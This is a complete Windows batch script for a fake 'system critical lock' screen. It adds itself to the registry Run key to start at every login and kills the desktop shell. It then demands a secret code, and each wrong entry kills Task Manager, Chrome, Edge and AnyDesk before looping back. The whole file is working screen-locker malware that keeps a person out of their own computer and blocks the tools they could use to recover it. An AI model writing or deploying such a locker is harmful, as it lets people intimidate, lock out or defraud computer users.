@echo off
title SYSTEM CRITICAL LOCK
color 0c

:: 1. Persistence (Runs on startup)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SysLock" /t REG_SZ /d "%~f0" /f >nul

:: 2. Kill the Desktop (The "Damage")
taskkill /f /im explorer.exe >nul 2>&1

:auth
cls
echo ======================================================
echo           UNAUTHORIZED ACCESS DETECTED
echo ======================================================
echo.
echo This system has been locked for security purposes.
echo Please enter the Authorization Code to restore access.
echo.
set /p "pass=Enter Code: "

:: 3. The Secret Phrase Check
if "%pass%"=="This is a sign." (
    goto unlock
) else (
    goto punish
)

:punish
echo.
echo INCORRECT CODE. SYSTEM ENTROPY INITIATED.
:: Kill everything they try to open
taskkill /f /im taskmgr.exe >nul 2>&1
taskkill /f /im chrome.exe >nul 2>&1
taskkill /f /im anydesk.exe >nul 2>&1
taskkill /f /im msedge.exe >nul 2>&1
:: Beep and loop back
echo ^G
timeout /t 2 >nul
goto auth

:unlock
echo.
echo CODE ACCEPTED. RESTORING SYSTEM...
:: Restore the desktop
start explorer.exe
:: Remove from startup so it doesn't loop forever
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SysLock" /f >nul
echo System Restored.
pause
exit
